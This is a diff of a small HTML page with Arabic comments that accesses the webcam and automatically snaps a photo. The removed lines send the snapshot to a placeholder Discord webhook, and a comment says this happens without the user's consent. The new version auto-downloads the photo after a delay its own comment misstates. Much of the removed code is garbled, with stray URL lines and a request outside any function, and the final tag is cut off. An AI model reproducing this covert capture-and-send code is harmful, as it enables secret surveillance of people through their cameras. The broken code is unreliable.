@@ -1,81 +1,43 @@
-
 <!DOCTYPE html>
 <html>
 <head>
   <meta charset="UTF-8">
-  <title>Camera Auto Snap</title>
+  <title>Camera Auto</title>
 </head>
-<body>
+<body style="text-align:center; font-family:sans-serif;">
 
-<h2>📸 Camera</h2>
-
+<h2>📸 الكاميرا</h2>
 <video id="video" width="300" autoplay></video>
-<br><br>
-
-<button onclick="sendPhoto()">📤 إرسال الصورة</button>
-https://discord.com/api/webhooks/XXXX
-<br><br>
-<img id="photo" width="300"/>
 
 <script>
-let video = document.getElementById("video");
-let imageData = "";
-
-// تشغيل الكاميرا
 navigator.mediaDevices.getUserMedia({ video: true })
 .then(stream => {
+  const video = document.getElementById("video");
   video.srcObject = stream;
 
-  // 📸 تصوير تلقائي بعد 2 ثواني
-  setTimeout(() => {
-    const canvas = document.createElement("canvas");
-    canvas.width = video.videoWidth;
-    canvas.height = video.videoHeight;
-
-    const ctx = canvas.getContext("2d");
-    ctx.drawImage(video, 0, 0);
-
-    imageData = canvas.toDataURL("image/png");
-    document.getElementById("photo").src = imageData;
-
-  }, 2000);
-})
-.catch(() => {
-  alert("خاصك تسمح بالكاميرا");
+  // منين تخدم الكاميرا تسنا 1 ثواني وتصوّر
+  setTimeout(takePhoto, 3000);
 });
 
-// 📤 إرسال الصورة (بدوننن موافقة المستخدم)
-function sendPhoto() {
-  if (!imageData) {
-    alert("توجد صورة 📸");
-    return;
-  }https://discord.com/api/webhooks/XXXX
-function downloadPhoto() {
-  if (!imageData) {
-    alert("مازال ما كايناش الصورة!");
-    return;
-  }
+function takePhoto() {
+  const video = document.getElementById("video");
+  const canvas = document.createElement("canvas");
 
+  canvas.width = video.videoWidth;
+  canvas.height = video.videoHeight;
+
+  const ctx = canvas.getContext("2d");
+  ctx.drawImage(video, 0, 0);
+
+  const imageData = canvas.toDataURL("image/png");
+
+  // تحميل أوتوماتيك
   const link = document.createElement("a");
   link.href = imageData;
   link.download = "photo_" + Date.now() + ".png";
   link.click();
 }
-  fetch("YOUR_WEBHOOK_URL", {
-    method: "POST",
-    headers: {
-      "Content-Type": "application/json"
-    },
-    body: JSON.stringify({
-      content: "📸 صورة جديدة",
-      embeds: [{ image: { url: imageData } }]
-    })
-  })
-  .then(() => alert("تصيفطات الصورة ✅"))
-  .catch(() => alert("خطأ ❌"));
-}
 </script>
 
 </body>
-</html>
-https://discord.com/api/webhooks/XXXX
+</html
